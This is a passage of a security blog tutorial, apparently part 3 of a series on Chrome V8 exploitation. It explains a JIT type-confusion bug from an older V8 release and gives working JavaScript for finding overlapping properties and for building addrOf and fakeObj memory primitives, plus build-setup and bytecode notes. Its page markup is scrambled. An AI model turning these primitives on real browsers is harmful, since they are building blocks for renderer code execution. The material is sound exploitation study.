    eval(`
    function vuln(obj) {
      &lt;span class=&#34;hljs-comment&#34;&gt;// Access Property inline of obj, forcing a CheckMap operation&lt;/span&gt;
      obj.&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;;
      &lt;span class=&#34;hljs-comment&#34;&gt;// Force a Map Transition via our side-effect&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Object.create(obj);
      &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing out-of-bound properties&lt;/span&gt;
      ${pNames.&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;((p) =&amp;gt; `let ${p} = obj.${p};`).join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\n&amp;apos;&lt;/span&gt;)}
      return [${pNames.join(&amp;apos;, &amp;apos;)}];
    }
  `)

    &lt;span class=&#34;hljs-comment&#34;&gt;// JIT code to trigger vuln&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-comment&#34;&gt;// Create Object and pass it to Vuln function&lt;/span&gt;
        let res = vuln(makeObj());
        &lt;span class=&#34;hljs-comment&#34;&gt;// Look for overlapping properties in results&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; res.length; i++) {
            &lt;span class=&#34;hljs-comment&#34;&gt;// If i is not the same value, and res[i] is between -32 and 0, it overlaps&lt;/span&gt;
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i !== -res[i] &amp;amp;&amp;amp; res[i] &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; res[i] &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;-32&lt;/span&gt;) {
                [p1, p2] = [i, -res[i]];
                &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
            }
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] Failed to find overlapping properties&amp;quot;&lt;/span&gt;;
}

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Finding Overlapping Properties...&amp;quot;&lt;/span&gt;);
findOverlappingProperties();
print(`[+] Properties p${p1} &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; p${p2} overlap!`);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;image%208.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;As mentioned, NameDictionary&amp;#x2019;s property placement is randomized at runtime, so you must discover pairs dynamically like this. Now that we have such a pair, let&amp;#x2019;s see how to use it to get Read/Write primitives!&lt;/p&gt;
&lt;h3 id=&#34;The-addrOf-Read-Primitive&#34;&gt;&lt;a href=&#34;#The-addrOf-Read-Primitive&#34; class=&#34;headerlink&#34; title=&#34;The addrOf Read Primitive&#34;&gt;&lt;/a&gt;The addrOf Read Primitive&lt;/h3&gt;&lt;p&gt;Create an inline object that stores a &lt;code&gt;double&lt;/code&gt; and then create another object that will be stored in the backing store, then trigger the Type Confusion. The result is that an object pointer gets interpreted as a &lt;code&gt;double&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// 1. Dynamically generate vuln function (bypass Map check)&lt;/span&gt;
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // We expect p1 to be a Double, but actually p2 (an Object pointer) is loaded&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x; &lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {&lt;span class=&#34;hljs-attr&#34;&gt;z&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;}; &lt;span class=&#34;hljs-comment&#34;&gt;// the target object whose address we want&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;}; &lt;span class=&#34;hljs-comment&#34;&gt;// Double (expected type)&lt;/span&gt;
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj}; &lt;span class=&#34;hljs-comment&#34;&gt;// Object (actually loaded value)&lt;/span&gt;

    &lt;span class=&#34;hljs-comment&#34;&gt;// 2. Drive JIT optimization and induce type confusion&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-comment&#34;&gt;// If the return value is not 13.37 (i.e., an address leaked), success&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt() - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// return address and remove tag&lt;/span&gt;
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] AddrOf Primitive Failed&amp;quot;&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Below is the Read Primitive code that includes the function above (if you want the pointer untagging logic, replace with the function above).&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Function that creates an object with one in-line and 32 out-of-line properties&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;makeObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(pValues)&lt;/span&gt; &lt;/span&gt;{
    let obj = {&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        Object.defineProperty(obj, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i, {
            writable: &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
            value: pValues[i]
        });
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj;
}
&lt;span class=&#34;hljs-comment&#34;&gt;// Function that finds a pair of properties where p1 is stored at the same offset&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;// in the FixedArray as p2 in the NameDictionary&lt;/span&gt;
let p1, p2;

&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;findOverlappingProperties&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// Create an array of all 32 property names such as p1..p32&lt;/span&gt;
    let pNames = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pNames[i] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i;
    }

    &lt;span class=&#34;hljs-comment&#34;&gt;// Create eval of our vuln function that will generate code during runtime&lt;/span&gt;
    eval(`
    function vuln(obj) {
      &lt;span class=&#34;hljs-comment&#34;&gt;// Access Property inline of obj, forcing a CheckMap operation&lt;/span&gt;
      obj.&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;;
      &lt;span class=&#34;hljs-comment&#34;&gt;// Force a Map Transition via our side-effect&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Object.create(obj);
      &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing out-of-bound properties&lt;/span&gt;
      ${pNames.&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;((p) =&amp;gt; `let ${p} = obj.${p};`).join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\n&amp;apos;&lt;/span&gt;)}
      return [${pNames.join(&amp;apos;, &amp;apos;)}];
    }
  `)

    &lt;span class=&#34;hljs-comment&#34;&gt;// Create an array of negative values from -1 to -32 to be used&lt;/span&gt;
    &lt;span class=&#34;hljs-comment&#34;&gt;// for out makeObj function&lt;/span&gt;
    let pValues = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pValues[i] = -i;
    }

    &lt;span class=&#34;hljs-comment&#34;&gt;// JIT code to trigger vuln&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-comment&#34;&gt;// Create Object and pass it to Vuln function&lt;/span&gt;
        let res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-comment&#34;&gt;// Look for overlapping properties in results&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; res.length; i++) {
            &lt;span class=&#34;hljs-comment&#34;&gt;// If i is not the same value, and res[i] is between -32 and 0, it overlaps&lt;/span&gt;
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i !== -res[i] &amp;amp;&amp;amp; res[i] &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; res[i] &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;-32&lt;/span&gt;) {
                [p1, p2] = [i, -res[i]];
                &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
            }
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] Failed to find overlapping properties&amp;quot;&lt;/span&gt;;
}

&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
    eval(`
    function vuln(obj) {
      obj.&lt;span class=&#34;hljs-keyword&#34;&gt;inline&lt;/span&gt;;
      &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;.Object.create(obj);
      &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing an out-of-bound property&lt;/span&gt;
        &lt;span class=&#34;hljs-comment&#34;&gt;// This will load p1 from our object thinking it&amp;apos;s a Double, but instead&lt;/span&gt;
        &lt;span class=&#34;hljs-comment&#34;&gt;// due to overlap, it will load p2 which is an Object&lt;/span&gt;
      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj.p${p1}.x;
    }
  `);

    let obj = {z: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    let pValues = [];
    pValues[p1] = {x: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;};
    pValues[p2] = {y: obj};

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (let i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        let res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            %DebugPrint(obj);
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res;
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] AddrOf Primitive Failed&amp;quot;&lt;/span&gt;
}

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Finding Overlapping Properties...&amp;quot;&lt;/span&gt;);
findOverlappingProperties();
print(`[+] Properties p${p1} &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; p${p2} overlap!`);
let x = addrOf();
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking Object Address...&amp;quot;&lt;/span&gt;);
print(`[+] Object Address: ${x}`);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When you run the code in &lt;code&gt;d8&lt;/code&gt;, you get a result like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%209.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The output labeled &lt;code&gt;Object Address&lt;/code&gt; is printed in double format because it&amp;#x2019;s interpreted as a &lt;code&gt;double&lt;/code&gt;. So you need to convert that double to an address &amp;#x2014; the conversion shown above will give you the address!&lt;/p&gt;
&lt;h3 id=&#34;The-fakeObj-Write-Primitive&#34;&gt;&lt;a href=&#34;#The-fakeObj-Write-Primitive&#34; class=&#34;headerlink&#34; title=&#34;The fakeObj Write Primitive&#34;&gt;&lt;/a&gt;The fakeObj Write Primitive&lt;/h3&gt;&lt;p&gt;You can get a write primitive by doing the reverse of the read primitive &amp;#x2014; no new vulnerability is required. That&amp;#x2019;s one of the strengths of Type Confusion: if a pointer is being interpreted as a double (and reading the pointer leaked an address), then writing to a double slot (via the same confusion) can instead write into the pointer&amp;#x2019;s target.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;fakeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      let orig = obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // Overwrite property x of p1, but due to type confusion&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // we overwrite property y of p2&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x = 0x41414141n;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return orig;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {&lt;span class=&#34;hljs-attr&#34;&gt;z&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;};
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj};

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res;
        }
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If you replace the &lt;code&gt;let x = addrOf();&lt;/code&gt; line in the Read primitive code with a call to &lt;code&gt;fakeObj()&lt;/code&gt; and run it in &lt;code&gt;d8&lt;/code&gt;, you&amp;#x2019;ll get results like below. As you can see, the &lt;code&gt;obj&lt;/code&gt; pointer&amp;#x2019;s address is overwritten with &lt;code&gt;0x41414141&lt;/code&gt;. Isn&amp;#x2019;t Type Confusion a delightfully simple way to get primitives? &amp;#x1F604;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%2010.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now that we have a read primitive for addresses and a write primitive that can overwrite an object pointer, the next step would be to refine these into full arbitrary memory read/write primitives (AAR/AAW) for exploitation. I intended to cover that here but ran out of space and want to produce a higher-quality write-up, so I&amp;#x2019;ll move that content to the next part.&lt;/p&gt;
&lt;p&gt;In the next part I&amp;#x2019;ll explain how Read/Write primitives in the Chrome renderer lead to RCE, and how renderer RCE changed after the Heap Sandbox was introduced. I&amp;#x2019;ll be back soon &amp;#x2014; see you next time! :)&lt;/p&gt;
&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-1/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-2/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-3/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-3/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/&#34;&gt;https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/&lt;/a&gt;&lt;/p&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^ Part 3.(EN) - hackyboiz">
  <meta property="og:description" content="&lt;p&gt;Hello! OUYA77 here. 2025 is already heading into the fourth quarter. Take care not to catch a seasonal cold, and I hope you spend the rest of the year without regrets &amp;#x1F44D;.&lt;/p&gt;
&lt;p&gt;In Part 1 We looked at Chrome&amp;#x2019;s overall architecture, and in Part 2 I covered how a Type Confusion vulnerability arises in the V8 engine and why that can lead to a Relative R/W primitive.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you haven&amp;#x2019;t read them&lt;br&gt;&amp;#x2192; &lt;a href=&#34;https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/&#34;&gt;Starting Chrome Exploitation with Type Confusion 101 ^-^&amp;#x2606; Part 1.&lt;/a&gt;&lt;br&gt;&amp;#x2192; &lt;a href=&#34;https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/&#34;&gt;Starting Chrome Exploitation with Type Confusion 101 ^-^&amp;#x2606; Part 2.&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This time I&amp;#x2019;ll write a bit article and &amp;#x2014; to get a real whiff of pwnable goodness &amp;#x2014; I&amp;#x2019;ll only recap the Relative R/W from last time and then look at the actual exploit payload used in practice! We&amp;#x2019;ve got a lot to cover, so let&amp;#x2019;s hurry :)&lt;/p&gt;
&lt;h2 id=&#34;0-Relative-R-W-Recap&#34;&gt;&lt;a href=&#34;#0-Relative-R-W-Recap&#34; class=&#34;headerlink&#34; title=&#34;0. Relative R/W Recap&#34;&gt;&lt;/a&gt;0. Relative R/W Recap&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;For performance, V8 relies on assumptions that objects&amp;#x2019; structures won&amp;#x2019;t change and therefore uses internal mechanisms like Hidden Classes (Maps) and ElementsKind. Based on that information, V8&amp;#x2019;s JIT compiler TurboFan produces high-performance native code. But JavaScript is extremely dynamic, and &lt;strong&gt;if an object&amp;#x2019;s structure or an array&amp;#x2019;s type changes at runtime, those assumptions can be violated.&lt;/strong&gt; If V8 fails to properly deoptimize the previously optimized code, the engine may access memory using incorrect type information &amp;#x2014; and, as shown above, that can enable Relative R/W.&lt;/p&gt;
&lt;p&gt;In this part we&amp;#x2019;ll take the journey from using a historical Chrome version to get a Relative Address R/W primitive via Type Confusion, refine that into an Arbitrary Address R/W, and proceed toward code execution. This post covers vulnerabilities from the era before the Heap Sandbox.&lt;/p&gt;
&lt;h2 id=&#34;1-Environments-Set-up&#34;&gt;&lt;a href=&#34;#1-Environments-Set-up&#34; class=&#34;headerlink&#34; title=&#34;1. Environments Set-up&#34;&gt;&lt;/a&gt;1. Environments Set-up&lt;/h2&gt;&lt;p&gt;There&amp;#x2019;s a well-written write-up for the set-up, so I won&amp;#x2019;t go into a long explanation here &amp;#x2014; I&amp;#x2019;ll just add a few notes about the parts that mattered to me while doing it.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Set-up link&amp;#x2192; &lt;a href=&#34;https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159&#34;&gt;https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Make sure the Windows SDK versions match exactly. In &lt;code&gt;depot_tools&lt;/code&gt; there&amp;#x2019;s a &lt;code&gt;python3.bat&lt;/code&gt;; when you run &lt;code&gt;where python&lt;/code&gt; in a cmd window, that &lt;code&gt;python3.bat&lt;/code&gt; should be the one that appears. Create a symbolic link named &lt;code&gt;python.bat&lt;/code&gt; that points to it, and put the &lt;code&gt;depot_tools&lt;/code&gt; folder at the very top of your &lt;code&gt;PATH&lt;/code&gt; environment variable. You&amp;#x2019;ll need this for the build!&lt;/p&gt;
&lt;p&gt;Finally, the build expects SDK &lt;code&gt;10.0.26100.0&lt;/code&gt;, so check that version in the Visual Studio Installer and download it. (&lt;code&gt;tools\dev\gm.py x64.debug&lt;/code&gt; has the version hardcoded, so it&amp;#x2019;s best to match that version when you build.)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;c:\dev\source\v8&amp;gt;python3 tools\dev\gm.py x64.debug
# gn gen out\x64.debug
Done. Made &lt;span class=&#34;hljs-number&#34;&gt;740&lt;/span&gt; targets &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;225&lt;/span&gt; files &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6288&lt;/span&gt;ms
# autoninja -C out\x64.debug d8
offline mode
ninja: Entering directory &lt;span class=&#34;hljs-string&#34;&gt;`out\x64.debug&amp;apos;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;exec_root=C:\dev\source\v8 dir=out\x64.debug&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;build finished&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;local:2609 remote:0 cache:0 cache-write:0(err:0) fallback:0 retry:0 skip:312&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;fs: ops: 41931(err:5273) / r:12710(err:0) 20.66GiB / w:122(err:0) 100.98MiB&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt; resource/capa used(err)  wait-avg |   s m |  serv-avg |   s m |&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  localexec/32   2527(0)  4m03.72s |&amp;#x2582; &amp;#x2582;&amp;#x2582;&amp;#x2587;&amp;#x2588;&amp;#x2583;|    10.08s | &amp;#x2582;&amp;#x2584;&amp;#x2587;&amp;#x2588;&amp;#x2582; |&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;14m13.39s Build Succeeded: 2609 steps - 3.06/s&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;Done! - V8 compilation finished successfully.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If you see a pleasant &lt;code&gt;Done!&lt;/code&gt; as shown above, the installation completed successfully! &amp;#x1F64C;&lt;/p&gt;
&lt;p&gt;The JavaScript engine &lt;strong&gt;V8&lt;/strong&gt; does not translate our code directly into machine code. Instead, it first compiles to an intermediate language called &lt;strong&gt;bytecode&lt;/strong&gt;. That bytecode is executed by the &lt;strong&gt;Ignition interpreter&lt;/strong&gt;, and hot/repeated code paths are optimized by the &lt;strong&gt;TurboFan compiler&lt;/strong&gt; into faster machine code.&lt;br&gt;Below is the key portion of the bytecode produced when running a simple JavaScript snippet &lt;code&gt;Array.from(String(&amp;apos;12345&amp;apos;))&lt;/code&gt; in the &lt;code&gt;d8&lt;/code&gt; shell.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%201.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Array.from(String(&amp;apos;12345&amp;apos;))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This code can be thought of in two main steps.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Execute &lt;code&gt;String(&amp;apos;12345&amp;apos;)&lt;/code&gt; to produce a string object.&lt;/li&gt;
&lt;li&gt;Execute &lt;code&gt;Array.from()&lt;/code&gt; to convert that string object into an array.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Inside V8, both steps are represented in the intermediate language called &lt;strong&gt;bytecode&lt;/strong&gt;. Bytecode and assembly are both low-level representations of code, but they differ significantly. Assembly (and machine code) issues instructions to specific hardware (the CPU), so it&amp;#x2019;s architecture-dependent and must be compiled for a particular CPU to run.&lt;/p&gt;
&lt;p&gt;By contrast, bytecode is an abstract set of instructions that is not tied to any specific hardware. It runs on top of a virtual &amp;#x201C;machine&amp;#x201D; &amp;#x2014; the Ignition interpreter &amp;#x2014; so JavaScript code can run immediately on different operating systems and CPU architectures without a separate compile step.&lt;/p&gt;
